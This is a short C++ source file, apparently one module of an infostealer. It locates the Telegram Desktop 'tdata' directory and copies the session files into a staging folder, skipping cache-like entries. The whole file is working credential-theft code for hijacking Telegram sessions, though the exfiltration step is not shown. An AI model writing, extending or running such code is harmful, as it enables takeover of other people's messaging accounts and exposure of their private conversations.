//
// Created by .1qxz on 07.06.2024.
//

#include "Telegram.h"

static const fs::path TDATA_PATH = Utils::getRoamingPath() / "Telegram Desktop" / "tdata";

void Telegram::execute(fs::path &root) {
    std::vector<fs::path> paths = Telegram::telegramFiles();

    if(paths.empty())
        return;

    fs::path dst = root / "Telegram";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}

std::vector<fs::path> Telegram::telegramFiles() {
    std::vector<fs::path> paths;
    for (const auto& entry : fs::directory_iterator(TDATA_PATH)) {
        const fs::path& item_path = entry.path();
        std::string item_path_str = item_path.string();

        if (item_path_str.find("user_data") != std::string::npos ||
            item_path_str.find("emoji") != std::string::npos ||
            item_path_str.find("temp") != std::string::npos) {
            continue;
        }

        paths.push_back(item_path);
    }

    return paths;
}
